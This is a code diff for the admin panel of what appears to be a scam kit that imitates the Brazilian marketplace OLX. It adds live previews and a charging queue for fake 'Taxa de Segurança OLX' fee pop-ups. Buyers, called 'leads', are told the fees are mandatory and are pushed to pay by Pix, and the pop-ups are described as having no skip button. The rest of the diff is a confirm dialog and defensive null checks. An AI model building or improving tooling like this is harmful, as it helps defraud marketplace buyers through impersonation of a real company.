@@ -2534,11 +2534,27 @@
           </div>
         </div>
 
-        <!-- Lista de Modais Vinculados a este produto -->
+        <!-- Lista de Modais Vinculados a este produto com Ordem de Execução -->
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
+          <span style="font-size:11px;font-weight:700;color:var(--c-t2);display:flex;align-items:center;gap:4px">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="12" height="12"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
+            Modais Configurados & Ordem na Fila:
+          </span>
+          <button type="button" class="btn btn-g btn-xs" onclick="previewCurrentFirstUpsell()" style="font-size:10.5px;padding:3px 9px;border-color:rgba(102,0,204,0.3);color:#C4B5FD">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="11" height="11"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            Preview Real
+          </button>
+        </div>
         <div id="prod-modal-upsell-list" style="display:flex;flex-direction:column;gap:8px">
           <div style="text-align:center;padding:14px;color:var(--c-t3);font-size:11px;background:rgba(255,255,255,0.02);border-radius:10px;border:1px dashed rgba(255,255,255,0.08)">
             Nenhum modal de taxa cadastrado para este anúncio. Clique em <b>+ Criar Modal de Taxa</b> ou escolha uma das taxas rápidas acima.
           </div>
+        </div>
+
+        <!-- Link Box restaurado para evitar quebra no openAddProd / openEditProd -->
+        <div class="link-box mb-12" id="edit-lnk-box" style="display:none;margin-top:14px;background:rgba(124,58,237,0.08);border:1px solid rgba(124,58,237,0.25);border-radius:10px;padding:10px 12px;align-items:center;gap:8px">
+          <input type="text" class="fi" id="edit-lnk" readonly style="font-size:11px;font-family:monospace;background:transparent;border:none;color:#A78BFA;padding:0;flex:1"/>
+          <button type="button" class="btn btn-g btn-xs" onclick="cpEditLnk()" style="border-color:rgba(124,58,237,0.3);color:#C4B5FD">Copiar Link</button>
         </div>
       </div>
 
@@ -2552,6 +2568,104 @@
     </div>
   </div>
 </div>
+
+<!-- ═══════════════════════════════════════════════════════════════
+     MODAL DE PREVIEW REAL DO CLIENTE (MOBILE FIDELITY)
+═══════════════════════════════════════════════════════════════ -->
+<div class="modal" id="upsell-preview-modal" style="z-index:99999">
+  <div class="modal-sheet" style="max-width:420px;padding:0;overflow:hidden;border-radius:24px;border:1.5px solid rgba(102,0,204,0.3);background:#fff;box-shadow:0 25px 60px rgba(0,0,0,0.6);animation:customModalPop .28s cubic-bezier(0.16,1,0.3,1)">
+    <!-- Barra Superior de Controle do Preview -->
+    <div style="background:#1e1b2e;padding:10px 16px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,0.08)">
+      <div style="display:flex;align-items:center;gap:6px">
+        <span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#10B981;box-shadow:0 0 8px #10B981"></span>
+        <span style="font-size:11px;font-weight:700;color:#fff;letter-spacing:.3px">PREVIEW DO CLIENTE (Fidelidade Real)</span>
+      </div>
+      <button type="button" onclick="closeUpsellPreview()" style="background:rgba(255,255,255,0.1);border:none;color:#fff;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer">✕</button>
+    </div>
+
+    <!-- Simulação da Tela Mobile do Cliente -->
+    <div style="background:#ffffff;color:#222;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;position:relative">
+      <!-- HEADER ROXO OLX -->
+      <div style="background:linear-gradient(135deg,#6600CC 0%,#8A2BE2 100%);padding:28px 20px 22px;text-align:center;position:relative;overflow:hidden">
+        <div style="position:absolute;top:-20px;right:-20px;width:100px;height:100px;border-radius:50%;background:rgba(255,255,255,0.06)"></div>
+        <div style="position:absolute;bottom:-30px;left:-10px;width:80px;height:80px;border-radius:50%;background:rgba(255,255,255,0.05)"></div>
+        
+        <!-- Ordem / Badge da Fila de Modais -->
+        <div id="prev-order-badge" style="display:inline-flex;align-items:center;gap:4px;margin-bottom:12px;background:rgba(255,255,255,0.22);border-radius:20px;padding:3px 12px;font-size:10px;font-weight:800;color:#fff;letter-spacing:.4px;text-transform:uppercase">
+          1º MODAL NA FILA
+        </div>
+
+        <div id="prev-icon-circle" style="width:62px;height:62px;border-radius:50%;background:rgba(255,255,255,0.18);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;color:white;box-shadow:0 8px 20px rgba(0,0,0,0.15)">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" width="30" height="30"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+        </div>
+        <h3 id="prev-title" style="font-size:18px;font-weight:900;color:#fff;margin:0;line-height:1.3">Taxa de Segurança OLX</h3>
+        <div id="prev-badge" style="display:inline-flex;align-items:center;gap:4px;margin-top:8px;background:rgba(255,255,255,0.15);border-radius:20px;padding:3px 10px;font-size:10px;font-weight:700;color:rgba(255,255,255,0.9)">
+          Seguro & Garantia
+        </div>
+      </div>
+
+      <!-- CORPO DO MODAL -->
+      <div style="padding:20px 22px 24px">
+        <p id="prev-desc" style="font-size:13px;color:#555;line-height:1.6;margin:0 0 16px;text-align:center">
+          Taxa obrigatória para processamento seguro e envio do pedido.
+        </p>
+
+        <!-- Card de Valor -->
+        <div style="background:linear-gradient(135deg,#f5f0ff,#faf4ff);border:1.5px solid rgba(102,0,204,0.14);border-radius:16px;padding:14px 16px;text-align:center;margin-bottom:16px">
+          <div style="font-size:10px;color:#6600CC;font-weight:800;letter-spacing:.08em;text-transform:uppercase;margin-bottom:4px">
+            Valor desta taxa
+          </div>
+          <div id="prev-amount" style="font-size:32px;font-weight:900;color:#6600CC;letter-spacing:-.01em">
+            R$ 29,90
+          </div>
+          <div style="font-size:10.5px;color:#888;margin-top:5px;display:flex;align-items:center;justify-content:center;gap:4px">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="11" height="11"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
+            Pagamento via Pix &bull; Aprovação imediata
+          </div>
+        </div>
+
+        <!-- Botão Pagar Agora (Simulado) -->
+        <button type="button" style="width:100%;padding:15px;background:linear-gradient(135deg,#6600CC,#9333EA);color:#fff;border:none;border-radius:14px;font-size:15px;font-weight:900;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 8px 24px rgba(102,0,204,0.3)">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" width="17" height="17"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+          Pagar Agora
+        </button>
+
+        <div style="text-align:center;margin-top:12px;font-size:10.5px;color:#999;display:flex;align-items:center;justify-content:center;gap:4px">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="11" height="11"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          Ambiente seguro &bull; Criptografado &bull; Sem botão de pular
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════
+     MODAL DE CONFIRMAÇÃO MODERNO / CUSTOMIZADO
+═══════════════════════════════════════════════════════════════ -->
+<div class="modal" id="custom-confirm-modal" style="z-index:99998">
+  <div class="modal-sheet" style="max-width:380px;padding:22px;border-radius:20px;border:1px solid rgba(255,255,255,0.1);background:#181528;box-shadow:0 25px 50px rgba(0,0,0,0.6);animation:customModalPop .24s cubic-bezier(0.16,1,0.3,1)">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
+      <div id="custom-confirm-icon-box" style="width:40px;height:40px;border-radius:12px;background:rgba(239,68,68,0.12);color:#F87171;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+      </div>
+      <div>
+        <h4 id="custom-confirm-title" style="margin:0;font-size:14px;font-weight:800;color:var(--c-text)">Confirmação</h4>
+        <p id="custom-confirm-desc" style="margin:3px 0 0;font-size:11.5px;color:var(--c-t2);line-height:1.4"></p>
+      </div>
+    </div>
+    <div style="display:flex;gap:8px;margin-top:18px">
+      <button type="button" class="btn btn-g" id="custom-confirm-cancel-btn" style="flex:1">Cancelar</button>
+      <button type="button" class="btn btn-d" id="custom-confirm-ok-btn" style="flex:1">Confirmar</button>
+    </div>
+  </div>
+</div>
+
+<style>
+@keyframes customModalPop {
+  0% { opacity:0; transform:scale(0.92) translateY(12px); }
+  100% { opacity:1; transform:scale(1) translateY(0); }
+}
+</style>
 
 <!-- ═══════════════════════════════════════════════════════════════
      UPSELL MANAGER MODAL — PROFISSIONAL
@@ -2727,6 +2841,10 @@
           <button class="btn btn-p" onclick="saveUpsellModal()" id="upsell-save-btn" style="flex:1;background:linear-gradient(135deg,#fb923c,#ea580c)">
             <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" width="13" height="13"><polyline points="20 6 9 17 4 12"/></svg>
             <span id="upsell-save-txt">Criar Modal</span>
+          </button>
+          <button type="button" class="btn btn-g" onclick="previewFormUpsell()" title="Visualizar como o comprador verá este modal" style="border-color:rgba(102,0,204,0.4);color:#C4B5FD;display:flex;align-items:center;gap:5px">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="13" height="13"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            Preview Real
           </button>
           <button class="btn btn-g" onclick="resetUpsellForm()" id="upsell-cancel-btn" style="display:none">
             <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="13" height="13"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
@@ -3491,17 +3609,22 @@ function openAddProd(){
   const cos = document.getElementById('edit-coupon-only-shipping');
   if(cos) cos.checked = true;
 
-  document.getElementById('edit-slug').disabled=false;
-  document.getElementById('edit-lnk-box').style.display='none';
-  prevProdPhoto(1, '');
-  prevProdPhoto(2, '');
-  prevProdPhoto(3, '');
+  const slugEl = document.getElementById('edit-slug');
+  if(slugEl) slugEl.disabled = false;
+  const lnkBox = document.getElementById('edit-lnk-box');
+  if(lnkBox) lnkBox.style.display = 'none';
+  if(typeof prevProdPhoto === 'function') {
+    prevProdPhoto(1, '');
+    prevProdPhoto(2, '');
+    prevProdPhoto(3, '');
+  }
   _PROD_BADGES = null;
   renderProdBadges();
   if(typeof clearSellerAvatar === 'function') clearSellerAvatar();
   if(typeof initLocSection === 'function') initLocSection('');
   if(typeof initProdUpsellSection === 'function') initProdUpsellSection('');
-  document.getElementById('prod-modal').classList.add('open');
+  const prodModal = document.getElementById('prod-modal');
+  if(prodModal) prodModal.classList.add('open');
 }
 
 function openEditProd(p){
@@ -3594,10 +3717,13 @@ function openEditProd(p){
   if(cos) cos.checked = p.coupon_only_shipping !== undefined ? (p.coupon_only_shipping == 1 || p.coupon_only_shipping === true) : true;
 
   if(code){
-    document.getElementById('edit-lnk').value=window.location.origin+'/p/'+(_SLUG ? _SLUG + '/' : '')+code;
-    document.getElementById('edit-lnk-box').style.display='flex';
+    const editLnk = document.getElementById('edit-lnk');
+    if(editLnk) editLnk.value = window.location.origin + '/p/' + (_SLUG ? _SLUG + '/' : '') + code;
+    const lnkBox = document.getElementById('edit-lnk-box');
+    if(lnkBox) lnkBox.style.display = 'flex';
   }
-  document.getElementById('prod-modal').classList.add('open');
+  const prodModal = document.getElementById('prod-modal');
+  if(prodModal) prodModal.classList.add('open');
   // Carrega zona personalizada do produto + inicializa seção de localização
   if(typeof initLocSection === 'function') initLocSection(p.breadcrumb_zone||'');
   if(typeof initProdUpsellSection === 'function') initProdUpsellSection(code);
@@ -3961,14 +4087,144 @@ async function loadUpsellModals() {
   } catch(e) { toast('Erro ao carregar modais.', 'err'); }
 }
 
+// ── SISTEMA DE MODAL DE CONFIRMAÇÃO PRÓPRIO E MODERNO ──
+function customConfirm({ title = 'Confirmação', desc = 'Deseja prosseguir com esta ação?', okText = 'Confirmar', isDanger = true }) {
+  return new Promise((resolve) => {
+    const modal = document.getElementById('custom-confirm-modal');
+    const tEl = document.getElementById('custom-confirm-title');
+    const dEl = document.getElementById('custom-confirm-desc');
+    const okBtn = document.getElementById('custom-confirm-ok-btn');
+    const cancelBtn = document.getElementById('custom-confirm-cancel-btn');
+    const iconBox = document.getElementById('custom-confirm-icon-box');
+
+    if (!modal) {
+      resolve(window.confirm(desc));
+      return;
+    }
+
+    if (tEl) tEl.textContent = title;
+    if (dEl) dEl.textContent = desc;
+    if (okBtn) {
+      okBtn.textContent = okText;
+      okBtn.className = isDanger ? 'btn btn-d' : 'btn btn-p';
+    }
+    if (iconBox) {
+      iconBox.style.background = isDanger ? 'rgba(239,68,68,0.12)' : 'rgba(139,92,246,0.15)';
+      iconBox.style.color = isDanger ? '#F87171' : '#A78BFA';
+    }
+
+    const cleanup = () => {
+      modal.classList.remove('open');
+      okBtn.onclick = null;
+      cancelBtn.onclick = null;
+    };
+
+    okBtn.onclick = () => { cleanup(); resolve(true); };
+    cancelBtn.onclick = () => { cleanup(); resolve(false); };
+    modal.classList.add('open');
+  });
+}
+
+// ── SISTEMA DE PREVIEW REAL DO CLIENTE (FIDELIDADE MOBILE) ──
+function openUpsellPreview(m, orderIndex = 0, totalModals = 1) {
+  if (!m) return;
+  const modal = document.getElementById('upsell-preview-modal');
+  if (!modal) return;
+
+  const tEl = document.getElementById('prev-title');
+  const dEl = document.getElementById('prev-desc');
+  const aEl = document.getElementById('prev-amount');
+  const bEl = document.getElementById('prev-badge');
+  const obEl = document.getElementById('prev-order-badge');
+  const icEl = document.getElementById('prev-icon-circle');
+
+  const amt = parseFloat(String(m.amount || '0').replace(',', '.')) || 0;
+  if (tEl) tEl.textContent = m.title || 'Taxa Obrigatória';
+  if (dEl) dEl.textContent = m.description || 'Taxa obrigatória para processamento seguro e envio do pedido.';
+  if (aEl) aEl.textContent = 'R$ ' + amt.toFixed(2).replace('.', ',');
+  if (bEl) bEl.textContent = m.type || 'Seguro & Garantia';
+
+  if (obEl) {
+    if (totalModals > 1) {
+      obEl.style.display = 'inline-flex';
+      const ordStr = (orderIndex + 1) + 'º';
+      obEl.textContent = `${ordStr} MODAL NA FILA ${orderIndex === 0 ? '(ENTRA PRIMEIRO)' : ''}`;
+    } else {
+      obEl.style.display = 'inline-flex';
+      obEl.textContent = 'MODAL EXCLUSIVO DO PRODUTO';
+    }
+  }
+
+  const iconKey = m.icon || 'shield-check';
+  const iconSvg = (typeof UPSELL_SVGS !== 'undefined' && UPSELL_SVGS[iconKey]) || '';
+  if (icEl && iconSvg) {
+    icEl.innerHTML = iconSvg;
+  }
+
+  modal.classList.add('open');
+}
+
+function closeUpsellPreview() {
+  const modal = document.getElementById('upsell-preview-modal');
+  if (modal) modal.classList.remove('open');
+}
+
+function previewFormUpsell() {
+  const title = (document.getElementById('upsell-title')?.value || '').trim() || 'Taxa de Segurança OLX';
+  const desc = (document.getElementById('upsell-desc')?.value || '').trim() || 'Taxa obrigatória para processamento seguro e envio do pedido.';
+  const amtRaw = (document.getElementById('upsell-amount')?.value || '').trim() || '29,90';
+  const type = document.getElementById('upsell-type')?.value || 'Seguro';
+  const icon = document.getElementById('upsell-icon')?.value || 'shield-check';
+  const pos = parseInt(document.getElementById('upsell-position')?.value || '0', 10) || 0;
+
+  openUpsellPreview({
+    title,
+    description: desc,
+    amount: amtRaw,
+    type,
+    icon
+  }, pos, Math.max((_upsellModals || []).length, 1));
+}
+
+function previewCurrentFirstUpsell() {
+  if (_upsellModals && _upsellModals.length > 0) {
+    openUpsellPreview(_upsellModals[0], 0, _upsellModals.length);
+  } else {
+    // Se não tiver nenhum criado ainda, abre simulação com exemplo vivo
+    openUpsellPreview({
+      title: 'Taxa de Segurança OLX',
+      description: 'Taxa obrigatória para processamento seguro e envio do pedido.',
+      amount: '29.90',
+      type: 'Seguro',
+      icon: 'shield-check'
+    }, 0, 1);
+  }
+}
+
+async function deleteUpsellModal(id, title) {
+  const ok = await customConfirm({
+    title: 'Excluir Modal de Taxa',
+    desc: `Tem certeza que deseja excluir o modal "${title}"? Ele deixará de ser cobrado do lead.`,
+    okText: 'Excluir Modal',
+    isDanger: true
+  });
+  if (!ok) return;
+  try {
+    const r = await apiFetch('/api/admin/upsell/modal/' + id, { method: 'DELETE' });
+    const d = await r.json();
+    if (d.ok) { toast('Modal removido com sucesso.', 'ok'); await loadUpsellModals(); }
+    else toast(d.error || 'Erro ao remover modal.', 'err');
+  } catch(e) { toast('Erro de rede ao remover.', 'err'); }
+}
+
 function renderUpsellList(modals) {
   const list = document.getElementById('upsell-list');
   const badge = document.getElementById('upsell-count-badge');
   const empty = document.getElementById('upsell-empty-msg');
-  badge.textContent = modals.length;
+  if (badge) badge.textContent = modals.length;
   if (!modals.length) {
-    list.innerHTML = '';
-    if (empty) { empty.style.display = ''; list.appendChild(empty); }
+    if (list) list.innerHTML = '';
+    if (empty && list) { empty.style.display = ''; list.appendChild(empty); }
     return;
   }
   if (empty) empty.style.display = 'none';
@@ -3982,104 +4238,65 @@ function renderUpsellList(modals) {
     const iconSvg = UPSELL_SVGS[iconKey] || UPSELL_SVGS['shield-check'];
     const typeLabel = m.type || '';
     const safeM = JSON.stringify(m).replace(/"/g, '&quot;');
+    const orderNum = i + 1;
+    const orderTag = modals.length > 1
+      ? (i === 0
+          ? '<span style="font-size:9.5px;padding:2px 7px;border-radius:20px;background:rgba(124,58,237,0.18);color:#C4B5FD;font-weight:800;border:1px solid rgba(124,58,237,0.35)">1º NA FILA (ENTRA PRIMEIRO)</span>'
+          : `<span style="font-size:9.5px;padding:2px 7px;border-radius:20px;background:rgba(255,255,255,0.05);color:var(--c-t2);font-weight:800;border:1px solid rgba(255,255,255,0.1)">${orderNum}º NA FILA</span>`)
+      : '<span style="font-size:9.5px;padding:2px 7px;border-radius:20px;background:rgba(124,58,237,0.18);color:#C4B5FD;font-weight:800;border:1px solid rgba(124,58,237,0.35)">MODAL ÚNICO</span>';
+
     return `
-    <div style="background:rgba(255,255,255,0.025);border:1.5px solid ${isActive ? 'rgba(251,146,60,0.22)' : 'rgba(255,255,255,0.05)'};border-radius:12px;padding:12px;transition:border-color .2s" id="ucard-${m.id}">
-      <div style="display:flex;align-items:flex-start;gap:10px">
+    <div style="background:rgba(255,255,255,0.025);border:1.5px solid ${isActive ? 'rgba(251,146,60,0.25)' : 'rgba(255,255,255,0.06)'};border-radius:14px;padding:13px;transition:all .2s;position:relative" id="ucard-${m.id}">
+      <div style="display:flex;align-items:flex-start;gap:12px">
         <!-- Icon bubble -->
-        <div style="width:38px;height:38px;border-radius:10px;background:${isActive ? 'rgba(251,146,60,0.12)' : 'rgba(255,255,255,0.05)'};display:flex;align-items:center;justify-content:center;flex-shrink:0;color:${isActive ? '#fb923c' : 'var(--c-t3)'}">
+        <div style="width:42px;height:42px;border-radius:11px;background:${isActive ? 'rgba(251,146,60,0.12)' : 'rgba(255,255,255,0.05)'};display:flex;align-items:center;justify-content:center;flex-shrink:0;color:${isActive ? '#fb923c' : 'var(--c-t3)'}">
           ${iconSvg}
         </div>
         <!-- Info -->
         <div style="flex:1;min-width:0">
-          <div style="display:flex;align-items:center;gap:5px;flex-wrap:wrap;margin-bottom:2px">
-            <span style="font-size:12px;font-weight:700;color:var(--c-text)">${m.title}</span>
+          <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:3px">
+            <span style="font-size:13px;font-weight:800;color:var(--c-text)">${m.title}</span>
+            ${orderTag}
             ${typeLabel ? `<span style="font-size:9px;background:rgba(139,92,246,0.12);color:#A78BFA;border-radius:20px;padding:1px 6px;font-weight:700">${typeLabel}</span>` : ''}
             ${isActive
-              ? '<span style="font-size:9px;background:rgba(16,185,129,0.12);color:#34D399;border-radius:20px;padding:1px 6px;font-weight:700;display:inline-flex;align-items:center;gap:2px"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" width="8" height="8"><polyline points="20 6 9 17 4 12"/></svg>ATIVO</span>'
+              ? '<span style="font-size:9px;background:rgba(16,185,129,0.12);color:#34D399;border-radius:20px;padding:1px 6px;font-weight:700">ATIVO</span>'
               : '<span style="font-size:9px;background:rgba(239,68,68,0.1);color:#F87171;border-radius:20px;padding:1px 6px;font-weight:700">INATIVO</span>'}
             ${isReplay
-              ? '<span style="font-size:9px;background:rgba(251,146,60,0.12);color:#fb923c;border-radius:20px;padding:1px 6px;font-weight:700;display:inline-flex;align-items:center;gap:2px"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" width="8" height="8"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.5"/></svg>REPLAY</span>'
+              ? '<span style="font-size:9px;background:rgba(251,146,60,0.12);color:#fb923c;border-radius:20px;padding:1px 6px;font-weight:700">REPLAY</span>'
               : ''}
           </div>
-          ${m.description ? `<div style="font-size:10px;color:var(--c-t2);line-height:1.4;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:240px;margin-bottom:4px">${m.description}</div>` : ''}
-          <div style="display:flex;align-items:center;gap:8px">
-            <span style="font-size:15px;font-weight:800;color:#fb923c">${fmtAmt}</span>
-            <span style="font-size:10px;color:var(--c-t3);display:flex;align-items:center;gap:3px">
-              <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="9" height="9"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/></svg>
-              Posição ${m.position ?? i}
-            </span>
+          ${m.description ? `<div style="font-size:10.5px;color:var(--c-t2);line-height:1.4;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:280px;margin-bottom:5px">${m.description}</div>` : ''}
+          <div style="display:flex;align-items:center;gap:10px">
+            <span style="font-size:16px;font-weight:900;color:#fb923c">${fmtAmt}</span>
           </div>
         </div>
         <!-- Action buttons -->
-        <div style="display:flex;flex-direction:column;gap:4px;flex-shrink:0">
-          <button onclick="editUpsellModal(${safeM})" title="Editar" style="width:28px;height:28px;border-radius:7px;border:1px solid rgba(139,92,246,0.3);background:rgba(139,92,246,0.08);color:#A78BFA;display:flex;align-items:center;justify-content:center;cursor:pointer">
+        <div style="display:flex;gap:5px;flex-shrink:0">
+          <button type="button" onclick="openUpsellPreview(${safeM}, ${i}, ${modals.length})" title="Ver Preview Real" style="width:30px;height:30px;border-radius:8px;border:1px solid rgba(102,0,204,0.35);background:rgba(102,0,204,0.1);color:#C4B5FD;display:flex;align-items:center;justify-content:center;cursor:pointer">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="13" height="13"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+          </button>
+          <button type="button" onclick="editUpsellModal(${safeM})" title="Editar" style="width:30px;height:30px;border-radius:8px;border:1px solid rgba(139,92,246,0.3);background:rgba(139,92,246,0.08);color:#A78BFA;display:flex;align-items:center;justify-content:center;cursor:pointer">
             <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="12" height="12"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
           </button>
-          <button onclick="deleteUpsellModal(${m.id}, '${(m.title || '').replace(/'/g, "\\'")}')" title="Excluir" style="width:28px;height:28px;border-radius:7px;border:1px solid rgba(239,68,68,0.22);background:rgba(239,68,68,0.06);color:#F87171;display:flex;align-items:center;justify-content:center;cursor:pointer">
+          <button type="button" onclick="deleteUpsellModal(${m.id}, '${(m.title || '').replace(/'/g, "\\'")}')" title="Excluir" style="width:30px;height:30px;border-radius:8px;border:1px solid rgba(239,68,68,0.22);background:rgba(239,68,68,0.06);color:#F87171;display:flex;align-items:center;justify-content:center;cursor:pointer">
             <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="12" height="12"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/><path d="M10 11v6"/><path d="M14 11v6"/></svg>
           </button>
         </div>
       </div>
-      <!-- Bottom bar -->
-      <div style="display:flex;align-items:center;justify-content:space-between;margin-top:10px;padding-top:8px;border-top:1px solid rgba(255,255,255,0.04)">
-        <label style="display:flex;align-items:center;gap:5px;cursor:pointer;font-size:10px;color:var(--c-t2)">
+      <!-- Bottom bar com reordenação -->
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-top:10px;padding-top:8px;border-top:1px solid rgba(255,255,255,0.05)">
+        <label style="display:flex;align-items:center;gap:5px;cursor:pointer;font-size:10.5px;color:var(--c-t2)">
           <input type="checkbox" ${isActive ? 'checked' : ''} onchange="toggleUpsellActive(${m.id}, this.checked)" style="accent-color:#fb923c;width:12px;height:12px"/>
-          ${isActive ? 'Desativar' : 'Ativar'}
+          ${isActive ? 'Desativar este modal' : 'Ativar este modal'}
         </label>
-        <div style="display:flex;gap:3px">
-          ${i > 0 ? `<button onclick="moveUpsellModal(${m.id}, -1)" title="Subir" style="width:22px;height:22px;border-radius:5px;border:1px solid var(--c-border);background:rgba(255,255,255,0.03);color:var(--c-t2);display:flex;align-items:center;justify-content:center;cursor:pointer"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" width="9" height="9"><polyline points="18 15 12 9 6 15"/></svg></button>` : '<span style="width:22px"></span>'}
-          ${i < modals.length - 1 ? `<button onclick="moveUpsellModal(${m.id}, 1)" title="Descer" style="width:22px;height:22px;border-radius:5px;border:1px solid var(--c-border);background:rgba(255,255,255,0.03);color:var(--c-t2);display:flex;align-items:center;justify-content:center;cursor:pointer"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" width="9" height="9"><polyline points="6 9 12 15 18 9"/></svg></button>` : '<span style="width:22px"></span>'}
+        <div style="display:flex;align-items:center;gap:4px">
+          <span style="font-size:10px;color:var(--c-t3);margin-right:4px">Ordem:</span>
+          ${i > 0 ? `<button type="button" onclick="moveUpsellModal(${m.id}, -1)" title="Subir na fila de cobrança" style="width:24px;height:24px;border-radius:6px;border:1px solid rgba(255,255,255,0.12);background:rgba(255,255,255,0.04);color:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" width="10" height="10"><polyline points="18 15 12 9 6 15"/></svg></button>` : '<span style="width:24px"></span>'}
+          ${i < modals.length - 1 ? `<button type="button" onclick="moveUpsellModal(${m.id}, 1)" title="Descer na fila de cobrança" style="width:24px;height:24px;border-radius:6px;border:1px solid rgba(255,255,255,0.12);background:rgba(255,255,255,0.04);color:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" width="10" height="10"><polyline points="6 9 12 15 18 9"/></svg></button>` : '<span style="width:24px"></span>'}
         </div>
       </div>
     </div>`;
   }).join('');
-}
-
-function getEffectiveProdCode() {
-  const code = (document.getElementById('edit-code')?.value || '').trim();
-  if (code) return code;
-  let slug = (document.getElementById('edit-slug')?.value || '').trim().replace(/[^a-z0-9_]/gi, '_').toLowerCase();
-  if (slug) return slug;
-  const name = (document.getElementById('edit-name')?.value || '').trim();
-  if (name) {
-    slug = name.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '').replace(/[^a-z0-9]+/g, '_').replace(/^_+|_+$/g, '');
-    if (slug) {
-      const slugEl = document.getElementById('edit-slug');
-      if (slugEl) slugEl.value = slug;
-      return slug;
-    }
-  }
-  slug = 'p_' + Math.random().toString(36).substring(2, 9);
-  const slugEl = document.getElementById('edit-slug');
-  if (slugEl) slugEl.value = slug;
-  return slug;
-}
-
-function openUpsellFromProdModal() {
-  const code = getEffectiveProdCode();
-  openUpsellManager(code);
-}
-
-async function initProdUpsellSection(code) {
-  _upsellProductCode = code || '';
-  if (code) {
-    await loadProdUpsellList(code);
-  } else {
-    renderProdUpsellCards([]);
-  }
-}
-
-async function loadProdUpsellList(code) {
-  if (!code) { renderProdUpsellCards([]); return; }
-  try {
-    const r = await apiFetch('/api/admin/upsell/' + code);
-    const d = await r.json();
-    const modals = d.modals || [];
-    _upsellModals = modals;
-    renderProdUpsellCards(modals);
-  } catch (e) {
-    renderProdUpsellCards([]);
-  }
 }
 
 function renderProdUpsellCards(modals) {
@@ -4101,36 +4318,47 @@ function renderProdUpsellCards(modals) {
     return;
   }
 
-  container.innerHTML = modals.map(m => {
+  container.innerHTML = modals.map((m, i) => {
     const amt = parseFloat(String(m.amount || '0').replace(',', '.')) || 0;
     const fmtAmt = 'R$ ' + amt.toFixed(2).replace('.', ',');
     const isActive = !!m.active;
